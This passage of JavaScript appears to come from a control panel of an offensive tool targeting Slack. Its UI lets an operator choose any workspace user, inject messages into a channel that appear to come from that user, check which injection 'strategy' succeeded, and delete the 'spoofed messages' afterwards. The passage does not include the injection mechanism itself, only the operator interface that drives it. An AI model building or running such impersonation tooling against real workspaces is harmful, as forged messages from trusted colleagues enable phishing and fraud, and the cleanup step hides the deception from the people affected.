    searchNextBtn.onclick = function() {
        if (searchQuery && searchResults && searchPage < (searchResults.pageCount || 1)) {
            doSearch(searchQuery, searchPage + 1);
        }
    };
}

// ===== Inject controls =====

function updateInjectControls() {
    var textInput = pluginUI.container.querySelector('#slack-inject-text');
    var injectBtn = pluginUI.container.querySelector('#slack-inject-btn');
    var enabled = !!(selectedInjectUser && currentChannelId);
    if (textInput) textInput.disabled = !enabled;
    if (injectBtn) injectBtn.disabled = !enabled;
}

function renderInjectUserDropdown(filter) {
    var dropdown = pluginUI.container.querySelector('#slack-inject-user-dropdown');
    if (!dropdown) return;

    if (!filter || filter.length < 1) {
        dropdown.style.display = 'none';
        return;
    }

    var lf = filter.toLowerCase();
    var matches = [];
    for (var i = 0; i < users.length; i++) {
        var u = users[i];
        if (u.deleted) continue;
        var nameMatch = (u.name || '').toLowerCase().indexOf(lf) !== -1;
        var realMatch = (u.realName || '').toLowerCase().indexOf(lf) !== -1;
        var idMatch = (u.id || '').toLowerCase().indexOf(lf) !== -1;
        if (nameMatch || realMatch || idMatch) {
            matches.push(u);
            if (matches.length >= 15) break;
        }
    }

    if (matches.length === 0) {
        dropdown.style.display = 'none';
        return;
    }

    var html = '';
    for (var m = 0; m < matches.length; m++) {
        var u = matches[m];
        html += '<div class="slack-inject-user-item d-flex align-items-center" data-idx="' + m + '" ' +
            'style="padding:4px 8px;cursor:pointer;border-bottom:1px solid #52565a;color:#aaa" ' +
            'onmouseover="this.style.background=\'#52565a\'" onmouseout="this.style.background=\'\'">';
        html += userInitialAvatar(u.name || u.realName || '', u.id || '');
        html += '<span style="color:#fff">' + esc(u.name || '') + '</span>';
        if (u.realName) {
            html += '<span class="text-muted ms-2 small">' + esc(u.realName) + '</span>';
        }
        html += '</div>';
    }

    dropdown.innerHTML = html;
    dropdown.style.display = '';

    // Wire click handlers
    var items = dropdown.querySelectorAll('.slack-inject-user-item');
    for (var c = 0; c < items.length; c++) {
        (function(item, idx) {
            item.onmousedown = function(e) {
                e.preventDefault(); // Prevent blur from hiding dropdown
                var u = matches[idx];
                selectedInjectUser = { id: u.id, name: u.name, realName: u.realName, avatar48: u.avatar48 || '' };
                var labelEl = pluginUI.container.querySelector('#slack-inject-selected-user');
                if (labelEl) labelEl.innerHTML = '<span style="color:#fff">' + esc(u.name) + '</span> <span class="text-muted">(' + esc(u.realName || u.id) + ')</span>';
                var searchInput = pluginUI.container.querySelector('#slack-inject-user-search');
                if (searchInput) searchInput.value = u.name;
                dropdown.style.display = 'none';
                updateInjectControls();
            };
        })(items[c], c);
    }
}

var injectUserSearch = pluginUI.container.querySelector('#slack-inject-user-search');
if (injectUserSearch) {
    injectUserSearch.oninput = function() {
        renderInjectUserDropdown(injectUserSearch.value);
    };
    injectUserSearch.onblur = function() {
        setTimeout(function() {
            var dropdown = pluginUI.container.querySelector('#slack-inject-user-dropdown');
            if (dropdown) dropdown.style.display = 'none';
        }, 200);
    };
}

// Inject button
var injectBtn = pluginUI.container.querySelector('#slack-inject-btn');
var injectTextInput = pluginUI.container.querySelector('#slack-inject-text');
if (injectBtn) {
    injectBtn.onclick = function() {
        if (!selectedInjectUser || !currentChannelId || !injectTextInput || !injectTextInput.value.trim()) return;
        var statusEl = pluginUI.container.querySelector('#slack-inject-status');
        if (statusEl) { statusEl.style.display = ''; statusEl.innerHTML = '<span class="text-muted"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Injecting...</span>'; }

        sendCommand({
            action: 'inject_message',
            channelId: currentChannelId,
            senderId: selectedInjectUser.id,
            text: injectTextInput.value.trim(),
            senderName: selectedInjectUser.realName || selectedInjectUser.name
        });

        var polls = 0;
        if (_injectPollTimer) clearInterval(_injectPollTimer);
        _injectPollTimer = setInterval(function() {
            polls++;
            if (polls > 30) {
                clearInterval(_injectPollTimer);
                _injectPollTimer = null;
                if (statusEl) statusEl.innerHTML = '<span class="text-muted">Timed out waiting for result</span>';
                return;
            }
            pluginUI.fetchData('inject_result', 5, 0).then(function(result) {
                var rows = result.rows || [];
                if (rows.length > 0) {
                    var d = rows[0].data || {};
                    clearInterval(_injectPollTimer);
                    _injectPollTimer = null;
                    if (statusEl) {
                        if (d.success) {
                            statusEl.innerHTML = '<span class="text-muted">Injected via ' + esc(d.strategy || '?') + '</span>';
                        } else {
                            statusEl.innerHTML = '<span class="text-muted">Failed: ' + esc(d.error || 'unknown') + '</span>';
                        }
                    }
                }
            });
        }, 1000);
    };
}

if (injectTextInput) {
    injectTextInput.onkeydown = function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            if (injectBtn) injectBtn.click();
        }
    };
}

// ===== Injected message cleanup =====

function updateClearInjectedButton() {
    var btn = pluginUI.container.querySelector('#slack-clear-injected-btn');
    var badge = pluginUI.container.querySelector('#slack-injected-count');
    if (!btn) return;
    if (injectedMessageCount > 0) {
        btn.style.display = '';
        if (badge) badge.textContent = injectedMessageCount;
    } else {
        btn.style.display = 'none';
    }
}

var clearInjectedBtn = pluginUI.container.querySelector('#slack-clear-injected-btn');
if (clearInjectedBtn) {
    clearInjectedBtn.onclick = function() {
        if (injectedMessageCount === 0) return;
        var statusEl = pluginUI.container.querySelector('#slack-inject-status');
        if (statusEl) { statusEl.style.display = ''; statusEl.innerHTML = '<span class="text-muted"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Cleaning up spoofed messages...</span>'; }

        sendCommand({ action: 'clear_injected' });

        var polls = 0;
        if (_clearInjectedPollTimer) clearInterval(_clearInjectedPollTimer);
        var _preClearCount = injectedMessageCount;
        _clearInjectedPollTimer = setInterval(function() {
            polls++;
            if (polls > 30) {
                clearInterval(_clearInjectedPollTimer);
                _clearInjectedPollTimer = null;
                // If count dropped to 0 via loadData, the cleanup worked even without the explicit result
                if (injectedMessageCount === 0 && _preClearCount > 0) {
                    updateClearInjectedButton();
                    if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleared ' + _preClearCount + ' spoofed message(s)</span>';
                } else {
                    if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleanup timed out</span>';
                }
                return;
            }
            // Force a loadData refresh so injectedMessageCount stays current
            loadData();
            // Early success: if injectedMessageCount already dropped to 0 via loadData refresh
            if (injectedMessageCount === 0 && _preClearCount > 0) {
                clearInterval(_clearInjectedPollTimer);
                _clearInjectedPollTimer = null;
                updateClearInjectedButton();
                if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleared ' + _preClearCount + ' spoofed message(s)</span>';
                return;
            }
            pluginUI.fetchData('clear_injected_result', 5, 0).then(function(result) {
                var rows = result.rows || [];
                if (rows.length > 0) {
                    var d = rows[0].data || {};
                    clearInterval(_clearInjectedPollTimer);
                    _clearInjectedPollTimer = null;
                    if (d.success) {
                        injectedMessageCount = 0;
                        updateClearInjectedButton();
                        if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleared ' + (d.cleared || 0) + ' spoofed message(s) via ' + esc(d.method || '?') + '</span>';
                    } else {
                        if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleanup failed: ' + esc(d.error || 'unknown') + '</span>';
                    }
                }
            });
        }, 1000);
    };
}

// Initial load + auto-refresh
loadData();
_refreshTimer = setInterval(loadData, 3000);
